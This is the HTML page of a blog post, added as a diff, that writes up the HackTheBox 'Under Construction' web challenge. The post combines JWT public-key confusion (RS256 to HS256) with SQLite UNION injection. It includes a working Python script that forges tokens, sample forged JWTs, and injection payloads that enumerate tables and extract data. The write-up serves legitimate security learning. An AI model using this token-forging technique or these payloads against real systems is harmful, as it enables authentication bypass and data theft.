@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GX2L7MWQLN');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      }
+    };
+  </script>
+  
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <style>
+          .MathJax {
+  font-size: 180%; /* Adjust the percentage as needed */
+}
+  </style>
+
+  <title>Under Construction - HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Under Construction - HackTheBox | Cecil Daemon’s Wish</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Under Construction - HackTheBox" />
+<meta name="author" content="J. Alex Buschinelli" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/under-construction-htb" />
+<meta property="og:url" content="http://localhost:4000/under-construction-htb" />
+<meta property="og:site_name" content="Cecil Daemon’s Wish" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-01-03T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Under Construction - HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2024-01-03T00:00:00+00:00","datePublished":"2024-01-03T00:00:00+00:00","description":"Introduction","headline":"Under Construction - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/under-construction-htb"},"url":"http://localhost:4000/under-construction-htb"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
+      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
+          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
+          
+          
+          <h1>cecil@celestial:/under-construction-htb$</h1>
+      
+      </a>
+  </div>
+  <br>
+    </a>
+    <div class="header-links">
+      <a href="/"><h2 class="header-link">Home</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Under Construction - HackTheBox</h2>
+  <time datetime="2024-01-03T00:00:00+00:00" class="by-line">03 Jan 2024</time>
+  <p>Estimated read time: 11 minutes</p>
+  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>
+
+<p>This challenge is one of the best CTFs I’ve ever played. It’s living proof of how simple things can unravel to reveal extraordinary complexity. HackTheBox always surprises me with its retired content.</p>
+
+<p>It took me almost three days to complete it, which I divided into three main activities:</p>
+
+<ul>
+  <li><strong>First day:</strong> playing with the problem and reading the source code.</li>
+  <li><strong>Second day:</strong> researching JWT vulnerabilities on the internet, related to the challenge.</li>
+  <li><strong>Third day:</strong>  tweaking my payloads until I solved the challenge.</li>
+</ul>
+
+<p>Let’s take a look at what this CTF is about.</p>
+
+<h1 id="challenge-description"><a href="#level-description"></a>Challenge description</h1>
+
+<p>The challenge description is:</p>
+
+<blockquote>
+  <p>Description</p>
+
+  <p>A company that specialises in web development is creating a new site that is currently under construction. Can you obtain the flag?</p>
+</blockquote>
+
+<p>Nothing too revealing. We know nothing else about our target. Let’s start the machine and access it.</p>
+
+<p>Once started, we will receive an IP and port, like: <code class="language-plaintext highlighter-rouge">&lt;ip&gt;:&lt;port&gt;</code>. My first step was to establish a connection with it using <code class="language-plaintext highlighter-rouge">telnet</code>. When dealing with a challenge that specifies a port with its address, I usually start with telnet to get a glance of what I’m dealing with.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>telnet 159.65.20.166 32211
+Trying 159.65.20.166...
+Connected to 159.65.20.166.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+abc 
+HTTP/1.1 400 Bad Request
+Connection: close
+
+Connection closed by foreign host.
+</code></pre></div></div>
+
+<p>This response indicates that the service is web-based, as it uses HTTP connections. Let’s access it with our browser:</p>
+
+<p><img src="../figs/underc1.png" alt="under construciton /auth page" /></p>
+
+<p>It seems like a register/login simple form. What to do now. Let’s open up BurpSuite to see what’s going on when we try to register a new user.</p>
+
+<p><img src="../figs/underc2.png" alt="register request/response" /></p>
+
+<p><img src="../figs/underc3.png" alt="login request/response" /></p>
+
+<p>As we can see, we successfully registered “mula” and logged in. We also got a session cookie, to what it seems to be a JWT (JSON Web Token) token.</p>
+
+<p>The challenge also lets us download some files. After downloading them, we can see that they are the source code of the page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb/underc <span class="nv">$ </span>unzip Under<span class="se">\ </span>Construction.zip 
+Archive:  Under Construction.zip
+  inflating: index.js                
+  inflating: package.json            
+   creating: middleware/
+  inflating: middleware/AuthMiddleware.js  
+   creating: helpers/
+  inflating: helpers/DBHelper.js     
+  inflating: helpers/JWTHelper.js    
+   creating: routes/
+  inflating: routes/index.js         
+   creating: views/
+  inflating: views/auth.html         
+  inflating: views/index.html
+</code></pre></div></div>
+
+<p>Upon a quick look at “index.js”, we find this line of code:</p>
+
+<p><img src="../figs/underc5.png" alt="index.js" /></p>
+
+<p>Indicating we have an authentication middleware that validates the request server-side. Let’s take a look at that now:</p>
+
+<p><img src="../figs/underc6.png" alt="middleware" /></p>
+
+<p>Which then leads us to the JWTHelper.js file, containing an implementation logic for JWT authentication:</p>
+
+<p><img src="../figs/underc7.png" alt="jwt-helper" /></p>
+
+<p>Now that we have a basic overview of what we are dealing with, let’s move on to our approach mindset.</p>
+
+<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>
+
+<p>As always, let’s keep our mindset:</p>
+
+<ol>
+  <li>Understanding basic concepts</li>
+  <li>Understanding the problem</li>
+  <li>Crafting an attack</li>
+  <li>Solving</li>
+</ol>
+
+<p>We’ve already done some really basic recon with the challenge files and a burpsuite. Let’s get started!</p>
+
+<h2 id="step-1---understanding-basic-concepts"><a href="#mindset-step1"></a>Step 1 - Understanding basic concepts</h2>
+
+<p>What are the things we need to know? First and foremost, we need to understand what are JWTs (JSON Web Tokens).</p>
+
+<h3 id="json-web-tokens">JSON Web Tokens</h3>
+<p>JWTs are tokens that define a self-secure way for transmitting information - as a JSON object - between users and the server. The form of a this JSON object consists of three partes separated by dots:</p>
+
+<ul>
+  <li>Header</li>
+</ul>
+
+<p>The header has two parts, the type or name of the token, which is usually JWT; and the signing algorithm, such as RSA or HMAC SHA256.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Payload</li>
+</ul>
+
+<p>The payload consists of the information to be transferred. This is usually the username, a message, user role, etc.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user1"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Signature</li>
+</ul>
+
+<p>And finally, the signature, which is the part of JWTs that ensures the token’s integrity and authenticity. The format of a JWT is like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;header-encoded&gt;.&lt;payload-encoded&gt;.&lt;signature&gt;
+</code></pre></div></div>
+
+<p>For more information, you can check it out <a href="https://jwt.io/introduction">here</a>.</p>
+
+<h2 id="step-2---understanding-the-problem"><a href="#mindset-step2"></a>Step 2 - Understanding the problem</h2>
+
+<p>Now that we know a bit more about JWTs, let’s go back to our application and check out the JWT issued when we logged in as “mula”. Let’s send the JWT generated by the server and use <a href="https://jwt.io">https://jwt.io</a> to decode it:</p>
+
+<p><img src="../figs/underc8.png" alt="jwt.io decoder" /></p>
+
+<p>In the payload we are receiving our username and a RSA public key, from what it seems. I also noticed that once we log in, our username is displayed on the webpage:</p>
+
+<p><img src="../figs/underc9.png" alt="authenticated challenge front page" /></p>
+
+<p>Ok. A few points to make here:</p>
+
+<ol>
+  <li>Every application that has user management must have a database and a way to communicate with this database.</li>
+  <li>The JWT sent to us as a cookie includes a public key, and the algorithm used for the signature is RS256.</li>
+</ol>
+
+<p>Let’s address each point individually:</p>
+
+<h3 id="database">Database?</h3>
+<p>If we investigate index.js file from the challenge, we shall find that it is importing a DBHelper, which is also located at the helpers directory we found our JWTHelper.js file. We will then find DBHelper.js, which is where the server communicates with its database:</p>
+
+<p><img src="../figs/underc10.png" alt="DBHelper.js" /></p>
+
+<p>Upon a quick search, I’ve found <a href="https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_nodejs.html">this</a> page about the <code class="language-plaintext highlighter-rouge">get</code> method used to query the database. We can see that their example shows that the construction of <code class="language-plaintext highlighter-rouge">getUser</code> method here is prone to SQL injection. This is because <code class="language-plaintext highlighter-rouge">username</code> is being passed directly into the SQL query, and not as a parameter. Back to index.js, we find that <code class="language-plaintext highlighter-rouge">getUser</code> is being called when someone access the / path, which fetches the username through the JWT token.</p>
+
+<h3 id="public-key">Public Key?</h3>
+
+<p>This looked odd to me, so I had to do a good research. My first research point was on <a href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555">HackTricks</a>, which showed a probably attack vector. With further investigation, I found the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens">OWASP</a> webpage explaining this attack. The attack is called “Public Key Confusion”. Some conditions must be met in order to make it work:</p>
+
+<ol>
+  <li>The server must expect a JWT to be signed with a public key (RSxxx or ESxxx).</li>
+  <li>The server must not check which algorithm the JWT is actually using, or accept both RSxxx and HSxxx.</li>
+  <li>The public key used to verify the JWT must be available.</li>
+</ol>
+
+<p>The attack happens because the server uses <code class="language-plaintext highlighter-rouge">jwt.verify</code> erroneously if the algorithm is changed from RSxxx to HSxxx. HMAC SHA256 is a symmetric encryption method, while RSA isn’t. In this vulnerability, if the algorithms are swapped, <code class="language-plaintext highlighter-rouge">jwt.verify</code> will make use of the public key as HMAC secret key to decode the JWT and verify it, thus making maliciously crafted token to be accepted by the application.</p>
+
+<p>Let’s see if it is our case. The first condition is met: the JWT header algorithm reveals to be RS256. The second condition is also met: if we look at the JWTHelper.js file, we see that in the decoding part the function accepts both RS256 and HS256.</p>
+
+<p><img src="../figs/underc11.png" alt="rs hs" /></p>
+
+<p>Let’s check if the public key provided by the application through the JWT is a valid signature. To do this, we will use <a href="https://jwt.io">https://jwt.io</a> again:</p>
+
+<p><img src="../figs/underc12.png" alt="jwt.io signing jwt" /></p>
+
+<p>After pasting the public key provided by the JWT in the box above, we can see that this is the key used to sign this token. Therefore, the third condition is also met.</p>
+
+<h2 id="step-3---crafting-the-attack"><a href="#mindset-step3"></a>Step 3 - Crafting the attack</h2>
+
+<p>Alright! Now let’s think of a way to attack the application. We have two vulnerabilities here: a SQL injection in the getUser function, which uses the username parameter provided by the JWT token without any sanitization; and the application is vulnerable to Public Key Confusion.</p>
+
+<p>By combining these vulnerabilities, the attack strategy becomes clear: we can craft a JWT with a SQL injection payload in the username field. By exploiting the public key confusion, we can make the application accept our JWT.</p>
+
+<p>First, let’s save the public key in our local machine under the name of <code class="language-plaintext highlighter-rouge">pubkey.pem</code>. Remember, for this to work, we need to save the key exactly as it is below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
+ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
+XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
+jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
++FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
+V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
+0wIDAQAB
+-----END PUBLIC KEY-----
+</code></pre></div></div>
+
+<p>No new lines, including both begin’s statements.</p>
+
+<p>Let’s build a Python script that will create a maliciously crafted and signed JWT:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span><span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">json</span>
+<span class="kn">import</span> <span class="n">hmac</span>
+<span class="kn">import</span> <span class="n">hashlib</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="n">argv</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+    <span class="n">argc</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">argc</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: python exploit.py &lt;payload&gt;</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    
+    <span class="n">sqli</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    
+    <span class="c1"># read pubkey file
+</span>    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./pubkey.pem</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">pk_contents</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+    
+    <span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">typ</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">JWT</span><span class="sh">"</span><span class="p">}</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">sqli</span><span class="p">,</span> <span class="sh">"</span><span class="s">pk</span><span class="sh">"</span><span class="p">:</span> <span class="n">pk_contents</span><span class="p">}</span>
+
+    <span class="c1"># convert the base64
+</span>    <span class="n">encoded_h</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">header</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">encoded_p</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="c1"># concatenate header and payload
+</span>    <span class="n">unsigned_jwt</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">encoded_h</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">encoded_p</span><span class="si">}</span><span class="sh">"</span>
+
+    <span class="c1"># HMAC 256 signing
+</span>    <span class="n">signature</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">pk_contents</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="n">unsigned_jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">).</span><span class="nf">digest</span><span class="p">()</span>
+    <span class="n">encoded_s</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">signature</span><span class="p">).</span><span class="nf">decode</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">jwt</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">unsigned_jwt</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">encoded_s</span><span class="si">}</span><span class="sh">"</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">jwt</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>To use this script, we simply run <code class="language-plaintext highlighter-rouge">chmod +x exploit.py</code>, and then <code class="language-plaintext highlighter-rouge">./exploit.py "sqli payload"</code>, and it will generate e usable JWT token for the application! To test if it is working, we will simply pass our username as a payload:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>./exploit.py <span class="s2">"mula"</span>
+eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJtdWxhIiwgInBrIjogIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4ifQ.qE9eS5hAKyvxgcVyh4Ne26-GNklpuDVNli4VkDeSYRQ
+</code></pre></div></div>
+
+<p>This JWT must log us in as mula, even though it is crafted and using HS256 algorithm instead of RS256:</p>
+
+<p><img src="../figs/underc13.png" alt="crafted jwt response" /></p>
+
+<p>As we can see, we successfuly logged in, proving the public key confusion vulnerability! To check if the server is vulnerable to SQL injection, we will use the following payload:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>./exploit.py <span class="s2">"' union SELECT ;--"</span>
+eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIFNFTEVDVCA7LS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.DucJUAHb7T7y4mjQltzMcgQaDodL1E7VcWAgruIiJnQ
+</code></pre></div></div>
+
+<p>This should produce a syntax error, since we are not selecting anything:</p>
+
+<p><img src="../figs/underc14.png" alt="sql error" /></p>
+
+<h2 id="step-4---solving"><a href="#mindset-step4"></a>Step 4 - Solving!</h2>
+
+<p>Alright! Now we need to solve this bad boy. We still don’t know where the flag is, but with a SQL injection we are able to enumerate the database tables and hopefully find the flag. The next payload is used for identifying the number of columns the of first select statement: <code class="language-plaintext highlighter-rouge">' union select 1,1,...,1-- -</code>, where the number of ones in the injection is the number of columns. We do this until we don’t get an error from the application. After attempting with (1), (1,1) and (1,1,1), we find that the number of columns is 3. The payload is:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>./exploit.py <span class="s2">"' union select 1,1,1-- -"</span>
+eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIHNlbGVjdCAxLDEsMS0tIC0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.y9yJbvfy0ARuq-hmEuYxSGJHcF5h1q3BonCf77iHi_c
+</code></pre></div></div>
+
+<p>Now, we need to find which columns are being retrieved by the application. To do so, we change our payload to <code class="language-plaintext highlighter-rouge">' union select 1,2,3-- -</code>. Since the application returns the username for us when we pass it in the token, this union select statement will print out the username column number. This is the response for this payload:</p>
+
+<p><img src="../figs/underc15.png" alt="second payload" /></p>
+
+<p>As we can see, the username column is the second one. We need to know this, because this is the column that the application prints out for us. If we want it to print the flag, we will need to inject the flag payload in this position.</p>
+
+<p>Now, to retrieve all the tables, we need to select the table names in the 2nd column position. With help of <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name">PayloadAllTheThings</a>, we can use <code class="language-plaintext highlighter-rouge">' union select 1, group_concat(tbl_name), 3 from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%'-- -</code>. This will fetch all tables in the database:</p>
+
+<p><img src="../figs/underc17.png" alt="third payload fetching table name" /></p>
+
+<p>So the table name is <code class="language-plaintext highlighter-rouge">flag_storage</code>. Now, we need to extract the column name. This payload should work: <code class="language-plaintext highlighter-rouge">' union select 1, sql, 3 from sqlite_master where type!='meta' and sql not null and name='flag_storage'-- -</code>:</p>
+
+<p><img src="../figs/underc18.png" alt="retrieving column name" /></p>
+
+<p>Now, to retrieve the flag, we simply use this paylaod <code class="language-plaintext highlighter-rouge">' union select 1, top_secret_flaag, 3 from flag_storage-- -</code>:</p>
+
+<p><img src="../figs/underc19.png" alt="flag" /></p>
+
+<p>And there is our flag!!!</p>
+
+<h1 id="conclusion"><a href="#conclusions"></a>Conclusion</h1>
+
+<p>This CTF provided an awesome experience. It involved two vulnerabilities, requiring careful and critical thinking. We learned a lot about SQLite injection and one of the many JWT vulnerabilities that exist out there. This challenge is an example of how things can go wrong due to a chain of vulnerabilities.</p>
+
+<p>I hope you liked this write-up and learned something new. As always, don’t forget to do your <strong>research!</strong></p>
+
+<p><a href="/">Go back</a></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alex Buschinelli</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
